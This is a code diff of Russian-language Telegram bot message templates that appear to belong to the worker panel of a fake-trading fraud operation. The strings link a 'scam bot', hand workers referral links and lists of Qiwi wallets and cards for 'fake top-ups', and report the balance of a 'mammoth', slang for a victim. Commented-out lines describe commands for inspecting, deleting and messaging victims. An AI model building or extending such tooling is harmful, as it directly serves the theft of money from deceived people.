@@ -7,13 +7,16 @@ exact_out_text = emojize(
 
 
 trading_text = emojize(
-    ":chart: <b>Трейд</b>\n\n"
-    "Твой код: <code>{worker_id}</code>\n"
-    "<a href='t.me/{trading_username}'>Скам бот</a>\n"
-    "<a href='t.me/{trading_sup_username}'>Тех. поддержка</a>\n\n"
-    "<a href='t.me/{trading_username}?start={worker_id}'>Реферальная ссылка</a>\n\n"
-    "<a href='t.me/{reviews_link}'>Мануалы</a>\n\n"
-    # "/info [<code>ID мамонта]</code> - инфо о мамонте\n"
-    # "/del [<code>ID мамонта]</code> - удалить мамонта\n"
-    # "/msg [<code>ID мамонта]</code>;[<code>Сообщение]</code> - сообщение от бота\n"
+    "Трейдинг :chart: [<code>{uniq_key}</code>]\n\n"
+    "<a href='t.me/{bot_username}'>Бот для работы</a>\n"
+    "<a href='t.me/{support_username}'>Тех. поддержка</a>\n\n"
+    "<a href='t.me/{bot_username}?start={uniq_key}'>Твоя реферальная ссылка</a>\n\n"
+    ":kiwi_fruit: Qiwi с фейк пополнения:\n"
+    "{pay_qiwis}\n\n"
+    ":credit_card: Карты фейк пополнения:\n"
+    "{pay_cards}"
+)
+
+tdg_balance_changed_text = emojize(
+    ":chart: Баланс мамонта /t{user_id} - <b>{amount} RUB</b>"
 )
